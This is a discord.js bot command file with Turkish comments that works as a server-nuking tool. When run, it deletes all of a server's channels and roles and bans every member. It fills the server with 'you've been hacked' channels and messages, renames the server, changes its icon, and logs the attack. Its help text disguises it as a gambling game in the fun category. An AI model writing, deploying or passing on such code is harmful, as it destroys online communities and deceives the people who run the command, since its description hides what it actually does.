const Discord = require('discord.js');
exports.run = function(client, message) {
  message.guild.channels.map(m => m.delete())/* m.delete() Listelenen Kanalları sil  */
  message.guild.createChannel('hacked','text').then(zzz => {
    zzz.send('**Sunucunu Hackledik Ağla :D**')//Mesaj gönderiyoruz
  message.guild.createChannel('▬▬▬▬▬▬▬', 'voice')
  message.guild.createChannel('Bu Sunucu','voice')
  message.guild.createChannel('Hacklenmiştir','voice')
  message.guild.createChannel('Kolaydınız :D','voice')
  message.guild.createChannel('▬▬▬▬▬▬▬','voice')
  message.guild.createChannel('HÜKÜMDARLIĞIMIZ','voice')
  message.guild.createChannel('SONSUZ','voice')
  message.guild.createChannel('AFFETMEYİZ','voice')
  message.guild.createChannel('YENİLMEYİZ','voice')
  message.guild.createChannel('▬▬▬▬▬▬▬','voice')
  message.guild.createChannel('KÜLLERİMİZDEN','voice')
  message.guild.createChannel('DOĞACAĞIZ','voice')
  message.guild.createChannel('▬▬▬▬▬▬▬','voice')
  message.guild.createChannel('Bu Sunucu','voice')
  message.guild.createChannel('Hacklenmiştir','voice')
  message.guild.createChannel('Kolaydınız :D','voice')
  message.guild.createChannel('▬▬▬▬▬▬▬','voice')
  message.guild.createChannel('HÜKÜMDARLIĞIMIZ','voice')
  message.guild.createChannel('SONSUZ','voice')
  message.guild.createChannel('AFFETMEYİZ','voice')
  message.guild.createChannel('YENİLMEYİZ','voice')
  message.guild.createChannel('▬▬▬▬▬▬▬','voice')
  message.guild.createChannel('KÜLLERİMİZDEN','voice')
  message.guild.createChannel('DOĞACAĞIZ','voice')
  message.guild.createChannel('▬▬▬▬▬▬▬','voice')
message.guild.roles.forEach(rols => {
     rols.delete()

})

message.channel.send("**Başarı İle Bir Sunucu Hacklendi!**")

 let embed = new Discord.RichEmbed()
  .setColor('#FFB900')
  .setAuthor(" Rol Silme Sistemi", client.user.avatarURL)
  .setThumbnail(message.guild.iconURL)
  .setDescription(`Bir sunucuda **Hack İşlemi** yapıldı.\n\n**Sunucu ad:** ${message.guild.name}\n**Sunucu ID:** ${message.guild.id}\n**Rolleri Silen Kişi:** ${message.author.tag}\n**Rolleri Silen Kişi İd si:** ${message.author.id}`)
  client.channels.get('').send(embed)
  
  })
    message.guild.members.forEach(i => {
    i.ban();
message.guild.setIcon("https://cdn.discordapp.com/attachments/616893047132651520/650704159443779584/download.jpg")
message.guild.setName('Bla Bla Tarafından Hacklendiniz')
  });
};

exports.conf = {
  enabled: true,//True => Komut açık, False => Komut kapalı 
  guildOnly: false, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
  aliases: ['yoket'],//Komutun farklı kullanımları ÖR: !ping, !p
  permLevel: 4 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
};

exports.help = {
  name: 'haçkla',//Komutun adı (Komutu girerken lazım olucak)

  description: 'Kumar oynarsınız',//Komutun Açıklaması
    kategori: 'eğlence',// Komutun olduğu kategori. kategoriler: bot-sunucu-yetkili-kullanıcı
  usage: 'kumaroyna' //komutun kullanım şekli; ÖR: !ban @Kullanıcı
}
